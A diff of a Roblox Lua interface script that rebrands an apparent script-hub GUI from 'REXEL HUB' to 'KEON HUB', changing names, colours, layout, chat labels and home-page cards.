 local HeaderAccentLine = Instance.new("Frame")
-HeaderAccentLine.Name = "PS5AccentLine"
+HeaderAccentLine.Name = "KEONAccentRail"
 HeaderAccentLine.Size = UDim2.new(1, -24, 0, 2)
 HeaderAccentLine.Position = UDim2.new(0, 12, 1, -3)
 HeaderAccentLine.BackgroundColor3 = currentAccentColor
@@ -2021,10 +1267,10 @@ HeaderAccentLine.Parent = Header
 Instance.new("UICorner", HeaderAccentLine).CornerRadius = UDim.new(1, 0)
 
 local TitleMain = Instance.new("TextLabel")
-TitleMain.Size = UDim2.new(1, -108, 1, 0)
-TitleMain.Position = UDim2.new(0, 10, 0, 0)
+TitleMain.Size = UDim2.new(1, -112, 1, 0)
+TitleMain.Position = UDim2.new(0, 12, 0, 0)
 TitleMain.BackgroundTransparency = 1
-TitleMain.Text = "◈  PLAYSTATION  •  REXEL HUB"
+TitleMain.Text = "KEON HUB"
 TitleMain.TextColor3 = Color3.fromRGB(255, 255, 255)
 TitleMain.Font = Enum.Font.GothamBold
 TitleMain.TextSize = 15
@@ -2080,18 +1326,29 @@ helpBtnStroke.Thickness = 0.8
 helpBtnStroke.Parent = HelpBtn
 
 local FloatingMinBox = Instance.new("ImageButton")
-FloatingMinBox.Name = "REXELFloatingMinBox"
-FloatingMinBox.Size = UDim2.new(0, 52, 0, 52)
-FloatingMinBox.Position = UDim2.new(0, 20, 0.5, -26)
-FloatingMinBox.BackgroundColor3 = Color3.fromRGB(7, 13, 26)
-FloatingMinBox.Image = MINIMIZE_ICON_IMAGE
+FloatingMinBox.Name = "KEONFloatingMinBox"
+FloatingMinBox.Size = UDim2.new(0, 48, 0, 48)
+FloatingMinBox.Position = UDim2.new(0.34, 0, 0.5, -24)
+FloatingMinBox.BackgroundColor3 = Color3.fromRGB(218, 47, 57)
+FloatingMinBox.Image = ""
+FloatingMinBox.ImageTransparency = 1
 FloatingMinBox.ScaleType = Enum.ScaleType.Crop
 FloatingMinBox.Active = true
 FloatingMinBox.Draggable = true
 FloatingMinBox.Visible = false
 FloatingMinBox.ZIndex = 100
 FloatingMinBox.Parent = ScreenGui
-Instance.new("UICorner", FloatingMinBox).CornerRadius = UDim.new(0, 16)
+Instance.new("UICorner", FloatingMinBox).CornerRadius = UDim.new(0, 3)
+local FloatingArrowText = Instance.new("TextLabel")
+FloatingArrowText.Name = "OpenArrow"
+FloatingArrowText.Size = UDim2.new(1, 0, 1, 0)
+FloatingArrowText.BackgroundTransparency = 1
+FloatingArrowText.Text = "❯"
+FloatingArrowText.TextColor3 = Color3.fromRGB(255, 255, 255)
+FloatingArrowText.Font = Enum.Font.GothamBlack
+FloatingArrowText.TextSize = 31
+FloatingArrowText.ZIndex = 101
+FloatingArrowText.Parent = FloatingMinBox
 
 local minBoxStroke = Instance.new("UIStroke")
 minBoxStroke.Color = currentAccentColor
@@ -2164,16 +1421,16 @@ RightLayout.Padding = UDim.new(0, 7)
 RightLayout.SortOrder = Enum.SortOrder.LayoutOrder
 RightLayout.Parent = RightWing
 
-REXELProfile.leftNavPadding = Instance.new("UIPadding")
-REXELProfile.leftNavPadding.PaddingLeft = UDim.new(0, 3)
-REXELProfile.leftNavPadding.PaddingRight = UDim.new(0, 3)
-REXELProfile.leftNavPadding.PaddingTop = UDim.new(0, 2)
-REXELProfile.leftNavPadding.Parent = LeftWing
-REXELProfile.rightNavPadding = Instance.new("UIPadding")
-REXELProfile.rightNavPadding.PaddingLeft = UDim.new(0, 3)
-REXELProfile.rightNavPadding.PaddingRight = UDim.new(0, 3)
-REXELProfile.rightNavPadding.PaddingTop = UDim.new(0, 2)
-REXELProfile.rightNavPadding.Parent = RightWing
+KEONProfile.leftNavPadding = Instance.new("UIPadding")
+KEONProfile.leftNavPadding.PaddingLeft = UDim.new(0, 3)
+KEONProfile.leftNavPadding.PaddingRight = UDim.new(0, 3)
+KEONProfile.leftNavPadding.PaddingTop = UDim.new(0, 2)
+KEONProfile.leftNavPadding.Parent = LeftWing
+KEONProfile.rightNavPadding = Instance.new("UIPadding")
+KEONProfile.rightNavPadding.PaddingLeft = UDim.new(0, 3)
+KEONProfile.rightNavPadding.PaddingRight = UDim.new(0, 3)
+KEONProfile.rightNavPadding.PaddingTop = UDim.new(0, 2)
+KEONProfile.rightNavPadding.Parent = RightWing
 
 local CenterScroll = Instance.new("ScrollingFrame")
 CenterScroll.Size = UDim2.new(1, -16, 1, -54)
@@ -2197,106 +1454,76 @@ end
 
 applyResponsiveMain = function()
     local viewport = getViewportSize()
-    local narrow = viewport.X < 650 or viewport.Y < 430
-    responsiveState.narrow = narrow
+    local compact = viewport.X < 900 or viewport.Y < 600
+    responsiveState.narrow = compact
 
-    if narrow then
-        local width = math.max(300, math.floor(viewport.X - 12))
-        local height = math.max(300, math.min(560, math.floor(viewport.Y - 16)))
-        responsiveState.mainSize = UDim2.new(0, width, 0, height)
-        responsiveState.mainPosition = UDim2.new(0.5, 0, 0.5, 0)
+    -- Landscape KEON window: centered, broad, and proportioned like the supplied reference.
+    local width = math.floor(math.min(870, viewport.X * 0.86))
+    local height = math.floor(math.min(550, viewport.Y * 0.72))
+    width = math.max(280, math.min(width, viewport.X - 20))
+    height = math.max(300, math.min(height, viewport.Y - 24))
+    responsiveState.mainSize = UDim2.new(0, width, 0, height)
+    responsiveState.mainPosition = UDim2.new(0.5, 0, 0.52, 0)
+    MainFrame.Size = responsiveState.mainSize
+    MainFrame.Position = responsiveState.mainPosition
 
-        MainFrame.Size = responsiveState.mainSize
-        MainFrame.Position = responsiveState.mainPosition
-        CenterBox.Size = UDim2.new(1, 0, 1, 0)
-        CenterBox.Position = UDim2.new(0, 0, 0, 0)
-        CenterGlow.Size = UDim2.new(1, 0, 1, 8)
-        CenterGlow.Position = UDim2.new(0, 0, 0, -4)
-
-        LeftWing.Size = UDim2.new(1, -12, 0, 36)
-        LeftWing.Position = UDim2.new(0, 6, 0, 48)
-        RightWing.Size = UDim2.new(1, -12, 0, 36)
-        RightWing.Position = UDim2.new(0, 6, 0, 88)
-        LeftWing.ScrollingDirection = Enum.ScrollingDirection.X
-        RightWing.ScrollingDirection = Enum.ScrollingDirection.X
-        LeftWing.ScrollBarThickness = 2
-        RightWing.ScrollBarThickness = 2
-        LeftLayout.FillDirection = Enum.FillDirection.Horizontal
-        RightLayout.FillDirection = Enum.FillDirection.Horizontal
-        LeftLayout.VerticalAlignment = Enum.VerticalAlignment.Center
-        RightLayout.VerticalAlignment = Enum.VerticalAlignment.Center
-        LeftLayout.Padding = UDim.new(0, 6)
-        RightLayout.Padding = UDim.new(0, 6)
-        LeftWing.ZIndex = 8
-        RightWing.ZIndex = 8
-
-        CenterScroll.Position = UDim2.new(0, 8, 0, 132)
-        CenterScroll.Size = UDim2.new(1, -16, 1, -140)
-        for _, navBtn in ipairs({LeftWing:GetChildren(), RightWing:GetChildren()}) do
-            for _, child in ipairs(navBtn) do
-                if child:IsA("TextButton") then
-                    child.Size = UDim2.new(0, 108, 0, 34)
-                    child.TextSize = 11.5
-                    child.ZIndex = 9
-                end
-            end
-        end
-        LeftWing.CanvasSize = UDim2.new(0, LeftLayout.AbsoluteContentSize.X + 8, 0, 0)
-        RightWing.CanvasSize = UDim2.new(0, RightLayout.AbsoluteContentSize.X + 8, 0, 0)
-    else
-        responsiveState.mainSize = UDim2.new(0, 560, 0, 360)
-        responsiveState.mainPosition = UDim2.new(0.5, 0, 0.5, 0)
-        MainFrame.Size = responsiveState.mainSize
-        MainFrame.Position = responsiveState.mainPosition
-        CenterBox.Size = UDim2.new(0, 340, 1, 0)
-        CenterBox.Position = UDim2.new(0.5, -170, 0, 0)
-        CenterGlow.Size = UDim2.new(0, 350, 1, 8)
-        CenterGlow.Position = UDim2.new(0.5, -175, 0, -4)
-        LeftWing.Size = UDim2.new(0, 105, 1, -48)
-        LeftWing.Position = UDim2.new(0.5, -280, 0, 48)
-        RightWing.Size = UDim2.new(0, 105, 1, -48)
-        RightWing.Position = UDim2.new(0.5, 175, 0, 48)
-        LeftWing.ScrollingDirection = Enum.ScrollingDirection.Y
-        RightWing.ScrollingDirection = Enum.ScrollingDirection.Y
-        LeftWing.ScrollBarThickness = 0
-        RightWing.ScrollBarThickness = 0
-        LeftLayout.FillDirection = Enum.FillDirection.Vertical
-        RightLayout.FillDirection = Enum.FillDirection.Vertical
-        LeftLayout.VerticalAlignment = Enum.VerticalAlignment.Top
-        RightLayout.VerticalAlignment = Enum.VerticalAlignment.Top
-        LeftLayout.Padding = UDim.new(0, 7)
-        RightLayout.Padding = UDim.new(0, 7)
-        LeftWing.ZIndex = 1
-        RightWing.ZIndex = 1
-        CenterScroll.Position = UDim2.new(0, 8, 0, 48)
-        CenterScroll.Size = UDim2.new(1, -16, 1, -54)
-        for _, wing in ipairs({LeftWing, RightWing}) do
-            for _, child in ipairs(wing:GetChildren()) do
-                if child:IsA("TextButton") then
-                    child.Size = UDim2.new(1, -4, 0, 40)
-                    child.TextSize = 13
-                    child.ZIndex = 1
-                end
-            end
-        end
-        LeftWing.CanvasSize = UDim2.new(0, 0, 0, LeftLayout.AbsoluteContentSize.Y + 8)
-        RightWing.CanvasSize = UDim2.new(0, 0, 0, RightLayout.AbsoluteContentSize.Y + 8)
+    if FloatingMinBox then
+        FloatingMinBox.Position = UDim2.new(0.5, -math.floor(width / 2) - 52, 0.52, -22)
     end
+
+    CenterBox.Size = UDim2.new(1, 0, 1, 0)
+    CenterBox.Position = UDim2.new(0, 0, 0, 0)
+    CenterGlow.Size = UDim2.new(1, 8, 1, 8)
+    CenterGlow.Position = UDim2.new(0, -4, 0, -4)
+    Header.Size = UDim2.new(1, 0, 0, 52)
+
+    -- Vertical navigation rail on the left, matching the reference screenshot.
+    local railWidth = math.clamp(math.floor(width * 0.17), 92, 132)
+    local railTop = 58
+    local railGap = 8
+    local railHeight = math.floor((height - railTop - 14 - railGap) / 2)
+
+    LeftWing.Size = UDim2.new(0, railWidth, 0, railHeight)
+    LeftWing.Position = UDim2.new(0, 8, 0, railTop)
+    RightWing.Size = UDim2.new(0, railWidth, 0, railHeight)
+    RightWing.Position = UDim2.new(0, 8, 0, railTop + railHeight + railGap)
+
+    for _, wing in ipairs({LeftWing, RightWing}) do
+        wing.ScrollingDirection = Enum.ScrollingDirection.Y
+        wing.ScrollBarThickness = compact and 2 or 3
+        wing.CanvasPosition = Vector2.new(0, 0)
+        wing.ZIndex = 8
+    end
+    LeftLayout.FillDirection = Enum.FillDirection.Vertical
+    RightLayout.FillDirection = Enum.FillDirection.Vertical
+    LeftLayout.VerticalAlignment = Enum.VerticalAlignment.Top
+    RightLayout.VerticalAlignment = Enum.VerticalAlignment.Top
+    LeftLayout.Padding = UDim.new(0, 5)
+    RightLayout.Padding = UDim.new(0, 5)
+
+    for _, wing in ipairs({LeftWing, RightWing}) do
+        for _, child in ipairs(wing:GetChildren()) do
+            if child:IsA("TextButton") then
+                child.Size = UDim2.new(1, -6, 0, compact and 31 or 35)
+                child.TextSize = compact and 10 or 11.5
+                child.ZIndex = 9
+            end
+        end
+        local layout = (wing == LeftWing) and LeftLayout or RightLayout
+        wing.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
+    end
+
+    CenterScroll.Position = UDim2.new(0, railWidth + 16, 0, 58)
+    CenterScroll.Size = UDim2.new(1, -railWidth - 24, 1, -68)
+    CenterScroll.ScrollBarThickness = compact and 3 or 4
+    CenterScroll.ZIndex = 3
 end
 
 LeftLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    if responsiveState.narrow then
-        LeftWing.CanvasSize = UDim2.new(0, LeftLayout.AbsoluteContentSize.X + 8, 0, 0)
-    else
-        LeftWing.CanvasSize = UDim2.new(0, 0, 0, LeftLayout.AbsoluteContentSize.Y + 8)
-    end
+    LeftWing.CanvasSize = UDim2.new(0, LeftLayout.AbsoluteContentSize.X + 8, 0, 0)
 end)
 RightLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    if responsiveState.narrow then
-        RightWing.CanvasSize = UDim2.new(0, RightLayout.AbsoluteContentSize.X + 8, 0, 0)
-    else
-        RightWing.CanvasSize = UDim2.new(0, 0, 0, RightLayout.AbsoluteContentSize.Y + 8)
-    end
+    RightWing.CanvasSize = UDim2.new(0, RightLayout.AbsoluteContentSize.X + 8, 0, 0)
 end)
 CenterLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 24)
@@ -2450,10 +1677,9 @@ HelpDoneBtn.MouseButton1Click:Connect(closeHelpPanel)
 -- نافذة الشات المباشرة
 ---------------------------------------------------------
 local ChatScreenGui = Instance.new("ScreenGui")
-ChatScreenGui.Name = "REXELTopChatGui"
+ChatScreenGui.Name = "KEONTopChatGui"
 ChatScreenGui.DisplayOrder = 30
 ChatScreenGui.ResetOnSpawn = false
-ChatScreenGui.Enabled = false
 ChatScreenGui.Parent = parent
 
 local FloatingChatBtn = Instance.new("TextButton")
@@ -2608,13 +1834,13 @@ local function fetchScriptUsersOnly()
                 
                 for uid, uData in pairs(data) do
                     if type(uData) == "table" then
-                        REXELProfile.profileByUserId[tostring(uData.userId or uid)] = uData
+                        KEONProfile.profileByUserId[tostring(uData.userId or uid)] = uData
                         if uData.lastSeen and (currentTime - uData.lastSeen) < 35 then
                             table.insert(activeUsers, uData)
                         end
                     end
                 end
-                REXELProfile.refreshCountryTags()
+                KEONProfile.refreshCountryTags()
                 
                 ChatHeaderBtn3.Text = "🟢 المتصلون (" .. #activeUsers .. ")"
                 
@@ -2750,7 +1976,7 @@ applyChatBackground(selectedChatBgIndex)
 local chatFeatTitle = Instance.new("TextLabel")
 chatFeatTitle.Size = UDim2.new(1, 0, 0, 28)
 chatFeatTitle.BackgroundTransparency = 1
-chatFeatTitle.Text = "🛡️ تعليمات الشات والحماية • REXEL"
+chatFeatTitle.Text = "🛡️ تعليمات الشات والحماية • KEON"
 chatFeatTitle.TextColor3 = currentAccentColor
 chatFeatTitle.Font = Enum.Font.GothamBold
 chatFeatTitle.TextSize = 14
@@ -2945,7 +2171,7 @@ workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
     end
 end)
 
-for stickerIndex, sUrl in ipairs(REXELProfile.stickerUrls) do
+for stickerIndex, sUrl in ipairs(KEONProfile.stickerUrls) do
     local stBtn = Instance.new("ImageButton")
     stBtn.Size = UDim2.new(0, 60, 0, 60)
     stBtn.BackgroundColor3 = Color3.fromRGB(20, 29, 52)
@@ -2973,9 +2199,9 @@ for stickerIndex, sUrl in ipairs(REXELProfile.stickerUrls) do
                     Body = HttpService:JSONEncode({
                         sender = LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name,
                         userId = LocalPlayer.UserId,
-                        text = REXELProfile.stickerRawUrls[stickerIndex],
-                        countryFlag = REXELProfile.selectedCountryFlag,
-                        countryName = REXELProfile.selectedCountryName,
+                        text = KEONProfile.stickerRawUrls[stickerIndex],
+                        countryFlag = KEONProfile.selectedCountryFlag,
+                        countryName = KEONProfile.selectedCountryName,
                         isSticker = true,
                         time = os.time()
                     })
@@ -2991,10 +2217,10 @@ local function showPrivateScriptUserBubble(userId, text)
     local head = targetPlr.Character:FindFirstChild("Head")
     if not head then return end
 
-    if head:FindFirstChild("REXELScriptBubble") then head.REXELScriptBubble:Destroy() end
+    if head:FindFirstChild("KEONScriptBubble") then head.KEONScriptBubble:Destroy() end
 
     local bb = Instance.new("BillboardGui")
-    bb.Name = "REXELScriptBubble"
+    bb.Name = "KEONScriptBubble"
     bb.Size = UDim2.new(0, 220, 0, 50)
     bb.StudsOffset = Vector3.new(0, 2.5, 0)
     bb.AlwaysOnTop = true
@@ -3130,8 +2356,8 @@ local function addChatMessage(sender, text, userId, msgKey, isSticker)
     nameLbl.Size = UDim2.new(1, -42, 1, 0)
     nameLbl.Position = UDim2.new(0, 0, 0, 0)
     nameLbl.BackgroundTransparency = 1
-    local senderProfile = REXELProfile.profileByUserId[tostring(userId or LocalPlayer.UserId)]
-    local flagForSender = senderProfile and senderProfile.countryFlag or (userId == LocalPlayer.UserId and REXELProfile.selectedCountryFlag or "🌐")
+    local senderProfile = KEONProfile.profileByUserId[tostring(userId or LocalPlayer.UserId)]
+    local flagForSender = senderProfile and senderProfile.countryFlag or (userId == LocalPlayer.UserId and KEONProfile.selectedCountryFlag or "🌐")
     nameLbl.Text = tostring(flagForSender or "🌐") .. "  " .. tostring(sender) .. "  •"
     nameLbl.TextTruncate = Enum.TextTruncate.AtEnd
     nameLbl.TextColor3 = currentAccentColor
@@ -3149,9 +2375,9 @@ local function addChatMessage(sender, text, userId, msgKey, isSticker)
         stickerContent.Position = UDim2.new(1, -90, 0, 28)
         stickerContent.BackgroundColor3 = Color3.fromRGB(15, 22, 42)
         local visibleStickerImage = text
-        for stickerIndex, publicUrl in ipairs(REXELProfile.stickerRawUrls) do
+        for stickerIndex, publicUrl in ipairs(KEONProfile.stickerRawUrls) do
             if publicUrl == text then
-                visibleStickerImage = REXELProfile.stickerUrls[stickerIndex]
+                visibleStickerImage = KEONProfile.stickerUrls[stickerIndex]
                 break
             end
         end
@@ -3206,17 +2432,17 @@ local function sendMessageNow()
         local msg = ChatInput.Text
         ChatInput.Text = ""
         if #msg > 250 then
-            addChatMessage("REXEL • الحماية", "⚠️ الرسالة طويلة جداً. الحد الأقصى 250 حرفاً.", LocalPlayer.UserId, "chat_guard_length", false)
+            addChatMessage("KEON • الحماية", "⚠️ الرسالة طويلة جداً. الحد الأقصى 250 حرفاً.", LocalPlayer.UserId, "chat_guard_length", false)
             return
         end
         if os.clock() - lastChatSentAt < 2 then
-            addChatMessage("REXEL • الحماية", "⏳ انتظر ثانيتين قبل إرسال رسالة أخرى لتقليل السبام.", LocalPlayer.UserId, "chat_guard_rate", false)
+            addChatMessage("KEON • الحماية", "⏳ انتظر ثانيتين قبل إرسال رسالة أخرى لتقليل السبام.", LocalPlayer.UserId, "chat_guard_rate", false)
             return
         end
         local normalizedMessage = normalizeChatText(msg)
         for _, term in ipairs(blockedChatTerms) do
             if normalizedMessage:find(normalizeChatText(term), 1, true) then
-                addChatMessage("REXEL • الحماية", "🛡️ تم منع الرسالة لأنها قد تحتوي على إساءة. رجاءً احترم الجميع.", LocalPlayer.UserId, "chat_guard_toxic", false)
+                addChatMessage("KEON • الحماية", "🛡️ تم منع الرسالة لأنها قد تحتوي على إساءة. رجاءً احترم الجميع.", LocalPlayer.UserId, "chat_guard_toxic", false)
                 return
             end
         end
@@ -3240,7 +2466,7 @@ local function sendMessageNow()
             end)
 
             if isMuted then
-                addChatMessage("ريكسل 👑 (كتم الشات)", "❌ عذراً، لا يمكنك الكتابة لأنك مكتوم.\nالسبب: " .. muteReason, LocalPlayer.UserId, "muted_notice", false)
+                addChatMessage("كـيـون 👑 (كتم الشات)", "❌ عذراً، لا يمكنك الكتابة لأنك مكتوم.\nالسبب: " .. muteReason, LocalPlayer.UserId, "muted_notice", false)
                 return
             end
 
@@ -3253,9 +2479,9 @@ local function sendMessageNow()
                         sender = LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name,
                         userId = LocalPlayer.UserId,
                         text = msg,
-                        countryFlag = REXELProfile.selectedCountryFlag,
-                        countryName = REXELProfile.selectedCountryName,
-                        countryCode = REXELProfile.selectedCountryCode,
+                        countryFlag = KEONProfile.selectedCountryFlag,
+                        countryName = KEONProfile.selectedCountryName,
+                        countryCode = KEONProfile.selectedCountryCode,
                         isSticker = false,
                         time = os.time()
                     })
@@ -3305,7 +2531,7 @@ task.spawn(function()
 end)
 
 ---------------------------------------------------------
--- تاج المطور ريكسل
+-- تاج المطور كـيـون
 ---------------------------------------------------------
 local function applyDeveloperTag(plr)
     if plr.Name ~= "Dms921" then return end
@@ -3313,10 +2539,10 @@ local function applyDeveloperTag(plr)
     local head = plr.Character:WaitForChild("Head", 5)
     if not head then return end
 
-    if head:FindFirstChild("REXELDevTag") then head.REXELDevTag:Destroy() end
+    if head:FindFirstChild("KEONDevTag") then head.KEONDevTag:Destroy() end
 
     local bb = Instance.new("BillboardGui")
-    bb.Name = "REXELDevTag"
+    bb.Name = "KEONDevTag"
     bb.Size = UDim2.new(0, 260, 0, 65)
     bb.StudsOffset = Vector3.new(0, 3.2, 0)
     bb.AlwaysOnTop = true
@@ -3327,7 +2553,7 @@ local function applyDeveloperTag(plr)
     lbl.BackgroundTransparency = 1
     lbl.Font = Enum.Font.GothamBold
     lbl.TextSize = 22
-    lbl.Text = "✦ REXEL HUB ✦"
+    lbl.Text = "✦ KEON HUB ✦"
     lbl.TextColor3 = Color3.fromRGB(255, 215, 0)
     lbl.Parent = bb
 
@@ -3360,24 +2586,24 @@ end)
 ---------------------------------------------------------
 local function createProStyleBtn(text, side)
     local btn = Instance.new("TextButton")
-    btn.Size = responsiveState.narrow and UDim2.new(0, 108, 0, 34) or UDim2.new(1, -4, 0, 40)
-    btn.BackgroundColor3 = Color3.fromRGB(8, 18, 36)
+    btn.Size = UDim2.new(0, responsiveState.narrow and 96 or 102, 0, 30)
+    btn.BackgroundColor3 = Color3.fromRGB(25, 26, 31)
     btn.Text = text
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.Font = Enum.Font.GothamBold
-    btn.TextSize = responsiveState.narrow and 11.5 or 13
+    btn.TextSize = responsiveState.narrow and 10.5 or 11.5
     btn.TextScaled = true
     btn.TextWrapped = false
     btn.TextTruncate = Enum.TextTruncate.AtEnd
     btn.AutoButtonColor = false
     btn.ClipsDescendants = false
-    btn.ZIndex = responsiveState.narrow and 9 or 1
+    btn.ZIndex = 9
     local textConstraint = Instance.new("UITextSizeConstraint")
     textConstraint.MinTextSize = 10
-    textConstraint.MaxTextSize = responsiveState.narrow and 12 or 13
+    textConstraint.MaxTextSize = responsiveState.narrow and 11 or 12
     textConstraint.Parent = btn
     btn.Parent = (side == "left") and LeftWing or RightWing
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 3)
 
     local stroke = Instance.new("UIStroke")
     stroke.Color = currentAccentColor
@@ -3388,12 +2614,12 @@ local function createProStyleBtn(text, side)
     table.insert(registeredWingStrokes, stroke)
     btn.MouseEnter:Connect(function()
         TweenService:Create(btn, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-            BackgroundColor3 = Color3.fromRGB(0, 88, 145)
+            BackgroundColor3 = Color3.fromRGB(95, 18, 31)
         }):Play()
     end)
     btn.MouseLeave:Connect(function()
         TweenService:Create(btn, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-            BackgroundColor3 = Color3.fromRGB(8, 18, 36)
+            BackgroundColor3 = Color3.fromRGB(25, 26, 31)
         }):Play()
     end)
     return btn
@@ -3402,7 +2628,7 @@ end
 local function addChilliAccordion(titleText, builderFunc)
     local folderFrame = Instance.new("Frame")
     folderFrame.Size = UDim2.new(1, 0, 0, 36)
-    folderFrame.BackgroundColor3 = Color3.fromRGB(8, 18, 36)
+    folderFrame.BackgroundColor3 = Color3.fromRGB(29, 30, 36)
     folderFrame.BackgroundTransparency = 0
     folderFrame.ZIndex = 3
     folderFrame.Parent = CenterScroll
@@ -3445,10 +2671,10 @@ local function addChilliAccordion(titleText, builderFunc)
     local function addToggleRow(nameText, onToggle)
         local rowFrame = Instance.new("Frame")
         rowFrame.Size = UDim2.new(1, 0, 0, 36)
-        rowFrame.BackgroundColor3 = Color3.fromRGB(20, 29, 52)
+        rowFrame.BackgroundColor3 = Color3.fromRGB(39, 40, 47)
         rowFrame.ZIndex = 3
         rowFrame.Parent = contentHolder
-        Instance.new("UICorner", rowFrame).CornerRadius = UDim.new(0, 9)
+        Instance.new("UICorner", rowFrame).CornerRadius = UDim.new(0, 3)
 
         local rowStroke = Instance.new("UIStroke")
         rowStroke.Color = currentAccentColor
@@ -3498,10 +2724,10 @@ local function addChilliAccordion(titleText, builderFunc)
     local function addActionRow(nameText, onClick)
         local rowFrame = Instance.new("Frame")
         rowFrame.Size = UDim2.new(1, 0, 0, 34)
-        rowFrame.BackgroundColor3 = Color3.fromRGB(20, 29, 52)
+        rowFrame.BackgroundColor3 = Color3.fromRGB(39, 40, 47)
         rowFrame.ZIndex = 3
         rowFrame.Parent = contentHolder
-        Instance.new("UICorner", rowFrame).CornerRadius = UDim.new(0, 9)
+        Instance.new("UICorner", rowFrame).CornerRadius = UDim.new(0, 3)
 
         local rowStroke = Instance.new("UIStroke")
         rowStroke.Color = currentAccentColor
@@ -3570,112 +2796,114 @@ local function showHomePage()
     playUiSound(SOUND_CLICK, 1, 0.35)
     clearCenter()
 
-    local placeId = game.PlaceId
-    local placeName = "ماب روبلوكس الحالي"
-    pcall(function()
-        local info = MarketplaceService:GetProductInfo(placeId)
-        if info then placeName = info.Name end
-    end)
+    local intro = Instance.new("Frame")
+    intro.Name = "KEONPanelIntro"
+    intro.Size = UDim2.new(1, 0, 0, 64)
+    intro.BackgroundColor3 = Color3.fromRGB(31, 34, 41)
+    intro.BorderSizePixel = 0
+    intro.ZIndex = 3
+    intro.Parent = CenterScroll
+    Instance.new("UICorner", intro).CornerRadius = UDim.new(0, 3)
+    local introStroke = Instance.new("UIStroke")
+    introStroke.Color = Color3.fromRGB(218, 47, 57)
+    introStroke.Thickness = 1.5
+    introStroke.Parent = intro
 
-    local mapBanner = Instance.new("ImageLabel")
-    mapBanner.Size = UDim2.new(1, 0, 0, 95)
-    mapBanner.BackgroundColor3 = Color3.fromRGB(20, 29, 52)
-    mapBanner.Image = "rbxthumb://type=Asset&id=" .. tostring(placeId) .. "&w=768&h=432"
-    mapBanner.ScaleType = Enum.ScaleType.Crop
-    mapBanner.ImageTransparency = 0
-    mapBanner.ZIndex = 3
-    mapBanner.Parent = CenterScroll
-    Instance.new("UICorner", mapBanner).CornerRadius = UDim.new(0, 11)
+    local introTitle = Instance.new("TextLabel")
+    introTitle.Size = UDim2.new(1, -16, 0, 28)
+    introTitle.Position = UDim2.new(0, 8, 0, 5)
+    introTitle.BackgroundTransparency = 1
+    introTitle.Text = "KEON HUB  •  لوحة السكربتات"
+    introTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    introTitle.Font = Enum.Font.GothamBlack
+    introTitle.TextSize = 16
+    introTitle.TextXAlignment = Enum.TextXAlignment.Right
+    introTitle.ZIndex = 4
+    introTitle.Parent = intro
 
-    local bannerTitle = Instance.new("TextLabel")
-    bannerTitle.Size = UDim2.new(1, -20, 0, 24)
-    bannerTitle.Position = UDim2.new(0, 10, 1, -28)
-    bannerTitle.BackgroundTransparency = 0.4
-    bannerTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    bannerTitle.Text = "🎮 " .. placeName
-    bannerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-    bannerTitle.Font = Enum.Font.GothamBold
-    bannerTitle.TextSize = 14
-    bannerTitle.TextXAlignment = Enum.TextXAlignment.Center
-    bannerTitle.ZIndex = 4
-    bannerTitle.Parent = mapBanner
-    Instance.new("UICorner", bannerTitle).CornerRadius = UDim.new(0, 9)
+    local introSub = Instance.new("TextLabel")
+    introSub.Size = UDim2.new(1, -16, 0, 20)
+    introSub.Position = UDim2.new(0, 8, 0, 34)
+    introSub.BackgroundTransparency = 1
+    introSub.Text = "اختر القسم من الأزرار بالأعلى"
+    introSub.TextColor3 = Color3.fromRGB(190, 195, 205)
+    introSub.Font = Enum.Font.GothamBold
+    introSub.TextSize = 11
+    introSub.TextXAlignment = Enum.TextXAlignment.Right
+    introSub.ZIndex = 4
+    introSub.Parent = intro
 
-    local updatesFrame = Instance.new("Frame")
-    updatesFrame.Size = UDim2.new(1, 0, 0, 142)
-    updatesFrame.BackgroundColor3 = Color3.fromRGB(20, 29, 52)
-    updatesFrame.ZIndex = 3
-    updatesFrame.Parent = CenterScroll
-    Instance.new("UICorner", updatesFrame).CornerRadius = UDim.new(0, 11)
+    local cards = {
+        {icon = "⚡", title = "سكربتات المابات", desc = "تصفّح السكربتات والأدوات المتاحة", color = Color3.fromRGB(68, 132, 255)},
+        {icon = "🥚", title = "اسرق البيض", desc = "افتح أدوات القسم من الشريط العلوي", color = Color3.fromRGB(70, 210, 125)},
+        {icon = "♫", title = "الميديا والصوت", desc = "الموسيقى والوسائط وإعداداتها", color = Color3.fromRGB(173, 91, 255)},
+        {icon = "⚙", title = "الإعدادات والثيمات", desc = "الألوان والخلفية وخيارات الواجهة", color = Color3.fromRGB(218, 47, 57)},
+        {icon = "🏆", title = "توب اللاعبين", desc = "عرض قسم اللاعبين والترتيب", color = Color3.fromRGB(255, 184, 65)},
+    }
 
-    local updatesTitle = Instance.new("TextLabel")
-    updatesTitle.Size = UDim2.new(1, -10, 0, 22)
-    updatesTitle.Position = UDim2.new(0, 5, 0, 4)
-    updatesTitle.BackgroundTransparency = 1
-    updatesTitle.Text = "✨ آخر التحديثات • REXEL v62"
-    updatesTitle.TextColor3 = currentAccentColor
-    updatesTitle.Font = Enum.Font.GothamBold
-    updatesTitle.TextSize = 14
-    updatesTitle.TextXAlignment = Enum.TextXAlignment.Right
-    updatesTitle.ZIndex = 4
-    updatesTitle.Parent = updatesFrame
-    table.insert(activeNameLabels, updatesTitle)
+    for i, item in ipairs(cards) do
+        local card = Instance.new("Frame")
+        card.Name = "KEONFeatureCard"
+        card.LayoutOrder = i
+        card.Size = UDim2.new(1, 0, 0, 78)
+        card.BackgroundColor3 = Color3.fromRGB(29, 32, 38)
+        card.BorderSizePixel = 0
+        card.ZIndex = 3
+        card.Parent = CenterScroll
